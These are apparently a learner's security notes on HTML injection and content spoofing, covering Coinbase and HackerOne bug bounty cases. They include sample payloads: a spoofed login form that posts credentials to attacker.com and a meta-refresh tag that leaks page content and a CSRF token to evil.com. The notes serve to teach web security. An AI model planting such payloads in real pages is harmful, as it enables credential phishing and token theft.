# HTML INJECTION AND CONTENT SPOOFING

- It allows malicious user to inject content into a site's web page
- Most commonly they inject in <form> tag
- This attack rely on fooling targets(sometimes called social engineering)
- This both vulnerability are less severe than other vulnerabilities

# HTML Injection
- It occurs when attacker submit HTML tags via some form input or URL parameter
- It is sometimes referred as virtual defacement
- Example
    - Rendering page content that you can control adding form asking user to re-enter username and password
        ```
        <form method="POST" action="http://attacker.com/capture.php" id="login-form">
            <input type="text" name="username">
            <input type="password" name="password">
            <input type="submit" value="Submit">
        </form>
        ```

# Content Spoofing
- It is similar to HTML injection except attackers can only inject plaintext, not HTML tags
- Attacker can't format web page with content spoofing but they can insert text such as message which can fool target into performing an action but rely heavily on socail engineering

**Example**
- **COINBASE COMMENT INJECTION THROUGH CHARACTER ENCODING
    - In HTML we have two characters
        - Reserved characters- angle brackets(<>)
        - Unreserved characters- letters of alphabet
    - Reserved character should be render using their HTML entity name to avoid injection
        - Render (>) as (&gt;)
    - But even unreserved can be render with HTML encoded number
        - Render (a) as (&#97;)
    - Here, enter below into text entry field made for user review
    ```
    <h1> This is test </h1>
    ```
        - Coinbase filder HTML and render as plaintext and submitted text would post as normal review
    - If user submitted text as HTML encoded value
        ```
        &#60;&#104;&#49;&#62; ..........................
        ```
        - Coinbase wouldn't filter tag and decode this string into HTML, which result website rendering h1 tag



- **Hackerone unintended HTML inclusion**
    - Markdown type of markup language uses specific syntax to generate HTML
    - Markdown accept and parse plaintext preceded by a hash symbol(#)
    - Syntax
        ```
        [text](https://torontowebsitedeveloper.com "your title tag")
        ```
            - This creates below HTML
        ```
        <a href="https://torontowebsitedeveloper.com" title="your title tag"> test </a>
        ```
    - <meta> tags tell browser to refresh page via the URL defined in content attribute of tag
    - Rendering page, browser perform GET request to identified URL
    - Content in the page can be sent as parameter of the GET request, which attacker use to extract target data
        ```
        <meta http-equiv="refresh" content='0;url=https://evil.com/log.php?text= 
        ```

    ```
    <html>
        <head>
            <meta http-equiv="refresh" content=(a)'0;url=https://evil.com/log.php?text= 
        </head>
        <body>
            <h1>Some content</h1>
            -------------------------
            -------------------------
            <input type="hidden" name="csrf-token" value="ab23V........">
            -------------------------
            <p>attacker input with '(b) </p>
            -------------------------
        </body>
    </html>
    ```
    - Here, Content attribute (a) to attacker input single quote at(b) would be send to attacker as part of URL's text parameter
    - Also include CSRF token
    - Here, HTML injection isn't issue because it uses React JS framework to render HTML
    - React escape all HTML unless JS function dangerouslySetInnerHTML is used to directly update DOM and render HTML
    - **DOM is an API for HTML and XML documents that allows developer to modify structure, style and content of web page via JS**
    - As HackerOne was using dangerouslySetInnerHTML because it trust HTML it was reveiving from server. So, it inject HTML directly in DOM without escaping
            

- **Hackerone Unintended HTML include fix Bypass**
    ```
    [test](http://www.torontowebsitedeveloper.com "test ismap="alert xss" yyy="test"")
    ```
    - This creates below HTML
    ```
    <a title="test' ismap="alert xss" yyy="test" href="http://www.torontowebsitedeveloper.com">test</a>
    ```
    - Here, markdown is confused with additional random double quotes and attributes and whether it would mistakely begin to track those as well
        - ismap = valid HTML attribute
        - yyy = invalid HTML attribute
    - It is an unintended bug that caused markdown parser to generate arbitary HTML

    ![Screenshot](../images/1.jpg)